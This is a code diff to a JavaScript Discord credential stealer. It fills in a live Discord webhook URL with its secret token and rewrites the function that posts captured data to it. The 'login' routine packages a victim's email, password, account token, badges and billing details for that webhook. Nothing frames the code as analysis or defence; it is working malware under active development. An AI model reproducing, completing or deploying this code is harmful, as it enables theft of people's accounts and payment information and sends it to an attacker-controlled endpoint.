@@ -11,7 +11,7 @@ function sleep(ms) {
 }
 
 const config = {
-  webhook: "%WEBHOOK%", 
+  webhook: 'https://discord.com/api/webhooks/1193940355742175312/kDCJG33U9wlz4BwOlcJeqj8-s_dTzN3OJS-6A3raPpyVPi-qtN_R7edOtMQ_kQIumMOS', 
   webhook_protector_key: '%HOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
@@ -228,40 +228,36 @@ const getBadges = (flags) => {
 };
 
 const hooker = async (content) => {
-    const data = JSON.stringify(content);
-    const url = new URL(config.webhook);
-    const headers = {
-      'Content-Type': 'application/json',
-      'Access-Control-Allow-Origin': '*',
-    };
-  
-    if (!config.webhook.includes('api/webhooks')) {
-      console.log("Invalid webhook URL");
-      return;
-    }
-  
-    const options = {
-      protocol: url.protocol,
-      hostname: url.host,
-      path: url.pathname,
-      method: 'POST',
-      headers: headers,
-    };
-  
-    const req = https.request(options, (res) => {
-      console.log(`statusCode: ${res.statusCode}`);
-      res.on('data', (d) => {
-        process.stdout.write(d);
-      });
-    });
-  
-    req.on('error', (err) => {
-      console.error(err);
-    });
-  
-    req.write(data);
-    req.end();
+  const url = new URL(config.webhook);
+  const data = JSON.stringify({ embeds: content.embeds }); // Stringify only the embeds array
+  const headers = {
+    'Content-Type': 'application/json',
+    'Access-Control-Allow-Origin': '*',
   };
+
+  const options = {
+    protocol: url.protocol,
+    hostname: url.hostname,
+    path: url.pathname,
+    method: 'POST',
+    headers: headers,
+  };
+
+  const req = https.request(options, (res) => {
+    console.log(`statusCode: ${res.statusCode}`);
+    res.on('data', (d) => {
+      process.stdout.write(d);
+    });
+  });
+
+  req.on('error', (err) => {
+    console.error(err);
+  });
+
+  req.write(data);
+  req.end();
+};
+
   
 
 const login = async (email, password, token) => {
@@ -270,6 +266,7 @@ const login = async (email, password, token) => {
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
   const content = {
+    content: config.ping_val,
     username: config.embed_name,
     avatar_url: config.embed_icon,
     embeds: [
@@ -313,7 +310,6 @@ const login = async (email, password, token) => {
       },
     ],
   };
-  if (config.ping_on_run) content['content'] = config.ping_val;
   hooker(content);
 };
 
